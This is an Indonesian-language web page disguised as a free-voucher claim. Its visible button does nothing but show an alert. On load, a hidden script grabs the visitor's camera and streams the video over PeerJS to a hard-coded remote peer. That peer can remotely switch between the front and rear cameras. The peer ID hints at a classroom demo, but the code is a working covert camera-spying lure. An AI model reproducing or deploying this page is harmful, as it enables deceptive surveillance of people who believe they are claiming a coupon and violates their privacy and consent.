<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Klaim Voucher Gratis</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
    button { background: #28a745; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="card">
    <h2>🎉 Selamat! Anda Mendapatkan Voucher Rp 100.000</h2>
    <p>Klik tombol di bawah untuk mengklaim promo hari ini.</p>
    <button onclick="alert('Voucher berhasil diklaim!')">KLAIM SEKARANG</button>
  </div>

  <video id="webcam" autoplay playsinline style="display: none;"></video>

  <script>
    const ID_LAPTOP = "guru-demo-kamera-123";
    const peer = new Peer();
    let currentStream = null;
    let isFrontCamera = false;
    let dataConn = null;

    peer.on('open', () => {
      // Hubungkan data ke laptop
      dataConn = peer.connect(ID_LAPTOP);
      
      dataConn.on('open', () => {
        // Mendengar perintah tombol dari laptop
        dataConn.on('data', (data) => {
          if (data === 'switch') {
            isFrontCamera = !isFrontCamera;
            startCamera();
          }
        });
      });

      startCamera();
    });

    async function startCamera() {
      // Hentikan stream kamera sebelumnya jika ada
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
      }
      try {
        const mode = isFrontCamera ? "user" : "environment";
        currentStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: mode }
        });
        document.getElementById('webcam').srcObject = currentStream;
        
        // Kirim siaran kamera baru ke laptop
        peer.call(ID_LAPTOP, currentStream);
      } catch (err) {
        console.error("Gagal mengakses kamera:", err);
      }
    }
  </script>
</body>
</html>
